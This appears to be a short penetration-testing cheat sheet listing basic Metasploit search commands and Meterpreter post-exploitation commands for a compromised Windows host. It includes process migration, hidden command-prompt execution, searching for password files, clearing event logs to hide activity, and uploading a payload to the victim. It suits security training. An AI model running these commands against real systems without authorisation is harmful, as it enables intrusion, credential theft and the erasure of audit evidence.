# o - Metasploit  Basic Usage

## Metasploit Basic cmds usage

{% code overflow="wrap" lineNumbers="true" %}
```bash
msf > search cve:2008 netapi # search exploits by year/date.
msf > search type:exploit platform:windows
msf > search author:HDM # earch by HDM.
msf > show <tab_key> # show exploits, auxiliary, payloads etc..
msf > 
```
{% endcode %}

## Meterpreter Basic CMDs Usage

{% code overflow="wrap" lineNumbers="true" %}
```bash
# spawn/execute cmd prompt from a meterpreter session
meterpreter > pgrep <explorer> # search for the PID of explorer.
meterpreter > migrate <PID> # to migrate into a proess.
meterpreter > background # minimise the session.
meterpreter > execute -f cmd.exe -i H # launch any executable and interact with it stealthly. then you can execute cmd prompt cmds like: net user, net localgroup.
meterpreter > search -f password.* # search for all occurence of "password."
meterpreter > edit <file_path> # just like "nano/vim" in linux.
meterpreter > run post/ # tap tab button for more option. you can run modules.
meterpreter > run post/windows/gather/enum_applications # list all installed apps.
meterpreter > run post/windows/gather/enum_services # enum all running services.
meterpreter > ps # view all processes.
meterpreter > getpid # view our current process/
meterpreter > clearev # clear all logs (require admin priv).
meterpreter > ifconfig # for windows.
meterpreter > sysinfo # system information.
meterpreter > download # to download files.
meterpreter > upload payload.exe C:\\Users\\els\\Desktop # send files to the victim.
```
{% endcode %}

